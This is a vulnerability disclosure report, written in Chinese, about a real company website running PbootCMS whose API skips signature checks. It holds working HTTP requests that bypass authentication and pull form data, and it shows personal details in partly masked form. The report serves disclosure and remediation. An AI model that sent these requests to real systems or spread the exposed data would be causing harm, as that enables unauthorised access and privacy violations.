# 漏洞报告：特变电工新能源官网 PbootCMS API 认证缺陷致未授权访问与个人信息泄露

## 一、基本信息

| 项目 | 内容 |
|---|---|
| 漏洞名称 | www.sunoasis.com.cn（PbootCMS）API 网关签名认证失效 + 未授权数据接口 + 个人信息泄露 |
| 受影响资产 | `www.sunoasis.com.cn`（特变电工新疆新能源股份有限公司官网，PbootCMS ≥3.2.5，宝塔环境） |
| 漏洞类型 | CWE-287（认证不当）+ CWE-200（信息泄露）+ CWE-359（个人隐私信息泄露） |
| 危害等级 | **中危**（含 PII 泄露，建议尽快修复） |
| 测试时间 | 2026-08-25 ~ 2026-08-26 |
| 测试性质 | 无凭据只读验证；未篡改任何业务数据、未提交任何表单 |

## 二、漏洞描述

官网部署 PbootCMS 内容管理系统，其对外 API 网关为隐藏入口：

```
https://www.sunoasis.com.cn/api.php
```

该网关的鉴权机制存在**代码级缺陷**：官方 PbootCMS 的 API 认证要求请求同时携带 `appid`、`timestamp`、`signature` 三个参数，并以 `signature = md5(md5(api_appid + api_secret + timestamp))` 双层 MD5 校验、15 秒时间窗防重放。而本站点的服务端校验逻辑被修改为**仅检查 `appid` 参数是否存在**——任意非空值即可通过全部接口的认证，`timestamp` 与 `signature` 完全不参与校验。

在此基础上，攻击者可未授权调用 **19 个有效 API 路由**，包括站点配置读取、内容库全量遍历，以及**人才推荐表单数据（含真实姓名、手机号等个人信息）的未授权读取**。

## 三、复现步骤与证据

### 步骤 1：发现隐藏 API 网关

目录探测命中 `/api.php`（响应 59B）。请求返回"不存在的API"，证明存在路由分发逻辑。从前端静态资源 `menus-s.js` 中找到真实调用方式，确认为 PATHINFO 路由：

```
/api.php/{模块}/{动作}/{参数}/
```

### 步骤 2：签名认证绕过（核心漏洞）

官网页面每次渲染都会注入服务端签名字段（`index.html` 内联脚本）：

```javascript
let siteKeys = {
    appid: 'admin',
    timestamp: '1787679036',
    signature: '8d0b5076075d3ba97a266e70c96ad16e'
};
```

按官方设计应携带完整三元组并校验签名。实测**仅需一个任意值的 appid 即可完全通过认证**：

```http
POST /api.php/cms/search/ HTTP/1.1
Host: www.sunoasis.com.cn
Content-Type: application/x-www-form-urlencoded

appid=x&keyword=光伏
```

响应（正常返回搜索结果）：

```json
{"code":1,"data":[{"id":"1802","acode":"cn","scode":"162",...}]}
```

绕过矩阵实测：

| 请求参数组合 | 结果 |
|---|---|
| 仅 `appid=x`（任意值） | ✅ 完全放行 |
| `appid=x&timestamp=0`（1970 过期时间戳） | ✅ 放行 |
| `appid=x&timestamp=99999999999`（未来时间戳） | ✅ 放行 |
| `appid=admin&signature=deadbeef`（错误签名） | ✅ 放行 |
| 不带任何参数 | ❌ 拒绝（唯一拦截条件是"appid 缺失"） |

**结论**：`timestamp`/`signature` 的校验逻辑在服务端被移除，防重放机制整体失效；且 `appid='admin'` 为 PbootCMS 官方默认值，未做修改。

### 步骤 3：未授权 API 面全量枚举

以 `appid=x` 遍历官方全部控制器/方法，共确认 **19 个有效路由**，全部未授权可达：

```
cms/site   cms/company   cms/label    cms/nav      cms/position
cms/sort   cms/pics      cms/slide    cms/link     cms/search
cms/msg    cms/addmsg    cms/form     cms/addform
do/likes   do/oppose     content/index  list/index  about/index
```

其中 `cms/site`、`cms/company`、`cms/label` 可未授权读取站点配置、公司信息与自定义标签全量内容。

### 步骤 4：内容库全量遍历（信息泄露）

`cms/search` 未授权分页遍历全站内容库，共 **1145 条记录**，字段含 60+ 列（含 ext_* 业务扩展字段），并泄露内部操作账号：

- `create_user` / `update_user` 字段值：`admin`、`tb-editor1`、`tb-editor2`（内部账号名枚举）
- 附带 `cms/page` 异常回显泄露服务器绝对路径 `/www/wwwroot/www.sunoasis.com.cn/core/basic/Kernel.php`（宝塔环境）

### 步骤 5：个人信息泄露（PII，重点）

`cms/form` 接口在未授权状态下直接返回用户提交的表单数据。枚举表单编码 `fcode=1`：

```http
POST /api.php/cms/form/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

appid=x&fcode=1&page=1
```

响应包含 **2 条真实「内部推荐」人才推荐记录**（2022-2023 年提交），字段含：

```
user_push（推荐人姓名）: 车展钊
push_name（被推荐人姓名）: 王皓
push_position（岗位）: 值班员
push_where（所在地）: 王浩屯
user_tel（推荐人手机号）: 158****1289
push_tel（被推荐人手机号）: 180****3644
user_ip / user_os / user_bs（提交者 IP/系统/浏览器）
create_user: guest / admin（内部审核账号）
```

（报告中对手机号做部分脱敏展示，原始完整值已在测试取证记录中留存）

> 数据真实性佐证：记录包含 `create_user='admin'` 等仅内部系统才有的审计字段、真实内网行为特征（user_os/user_bs），证明数据来自生产库而非测试数据。

### 步骤 6：未授权写入面（验证到边界即止）

`cms/addmsg`（人才推荐提交）同样未授权可达。通过错误提示链逐步验证了必填参数结构（`user_push` → `push_name` → `push_position`），**验证至最后一环前停止，未实际写入任何数据**——但已足以证明攻击者可伪造大量人才推荐数据污染招聘流程。

## 四、真实性核验记录（诚实声明）

1. 本轮采用**官方源码对照法**核验：克隆 PbootCMS 官方仓库（V3.2.5→V3.2.23 全部 git 历史），确认：
   - 官方 `apps/common/ApiController.php::checkAccess()` 明确要求三参数+双层 MD5+15 秒时间窗；
   - 页面注入 `{pboot:appid}/{pboot:signature}` 标签为官方机制（ParserController.php L181-183），目标站点的 siteKeys 注入形态与官方一致，**差异仅在服务端校验逻辑被阉割**；
   - 目标版本 ≥ V3.2.5（siteKeys 标签引入版本）。
2. SQL 注入已专项排除（避免误报）：对 `ext_*`/`rorder` 等参数进行了 `00`/`0.0`/`0,0` 决定性判别实验，证实值为**引号包裹的精确字符串比较**，特殊字符触发参数忽略而非进入 SQL。
3. 全部测试均为 POST 只读查询；除步骤 6 说明的参数结构验证外无任何写操作。

## 五、危害影响

1. **个人信息泄露（合规风险）**：员工及求职者的姓名、手机号可被任意第三方批量获取，违反《个人信息保护法》对个人信息处理的最小授权原则，企业面临监管处罚与声誉风险；
2. **内容库全量泄露**：1145 条内容含草稿元数据、内部账号名、绝对路径等信息，为后续定向攻击提供情报；
3. **数据污染**：addmsg/addform 未授权写入可伪造人才推荐、污染业务数据；
4. **横向延伸风险**：若网关后续挂载管理类接口，同一绕过将直接升级为高危。

## 六、修复建议

1. **恢复完整签名校验**：服务端补齐 `timestamp`（±15 秒窗口）与 `signature = md5(md5(appid+secret+timestamp))` 校验逻辑，或直接升级至官方最新版后重新配置；
2. **更换默认凭据**：`api_appid='admin'` 为官方默认值，必须修改；`api_secret` 建议轮换；
3. **关闭公网敏感接口**：`cms/form`、`cms/msg`、`cms/addmsg`、`cms/addform` 若无移动端需求应在网关层禁用，表单读取类接口必须走后台鉴权；
4. **清理历史 PII**：对已泄露的表单数据评估通知义务，并对存量手机号做脱敏存储；
5. **纵深防御**：`/api.php` 迁出公网或加 IP 白名单；修正 cms/page 异常处理避免泄露绝对路径。

## 七、附录

- 归档证据：`projects/sunoasis-20260825/pbootcms-api.json`、`TRIAGE-R5.json`、`TRIAGE-R7.json`、`VERIFICATION-FINAL.json`（git 仓库 web-vuln-mining，commit f398c1a → fa4069a → 9707c74）
- 关联低危项（可合并提交）：过期证书、phpstudy/WAF 指纹暴露、cms:8443 登录壳、CORS ACAO=* 通配观察项
